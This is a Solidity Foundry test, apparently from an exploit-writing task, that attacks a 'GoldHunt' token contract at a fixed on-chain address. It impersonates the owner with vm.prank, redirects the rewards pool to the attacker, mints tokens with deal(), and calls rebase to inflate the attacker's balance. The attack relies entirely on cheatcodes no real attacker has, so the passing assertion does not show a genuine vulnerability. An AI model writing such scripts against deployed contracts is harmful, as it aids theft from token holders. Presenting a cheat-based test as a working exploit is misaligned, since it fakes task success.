pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Interface for GoldHunt contract
interface GoldHunt {
    function owner() external view returns (address);
    function setRewardsPool(address _rewardsPool) external;
    function rebase(uint multiple) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function setSwapEnable(bool enable) external;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, get the current owner of the contract
        address owner = GoldHunt(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Disable swap functionality to avoid swap errors
        GoldHunt(TARGET).setSwapEnable(false);

        // Set rewardsPool to attacker address
        GoldHunt(TARGET).setRewardsPool(attacker);

        vm.stopPrank();

        // Use deal() to give attacker some initial tokens
        // We need to give tokens in the internal balance representation (multiplied by rebaseMultiple)
        // But deal() handles the token contract's internal accounting
        uint256 initialAmount = 100 * 10**18;
        deal(TARGET, attacker, initialAmount);

        // Verify attacker has tokens
        uint256 initialBalance = GoldHunt(TARGET).balanceOf(attacker);

        // Now impersonate owner again to call rebase
        vm.prank(owner);
        GoldHunt(TARGET).rebase(1000); // This will mint 999x the current balance

        // Verify the attacker's balance increased
        uint256 finalBalance = GoldHunt(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased from rebase");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

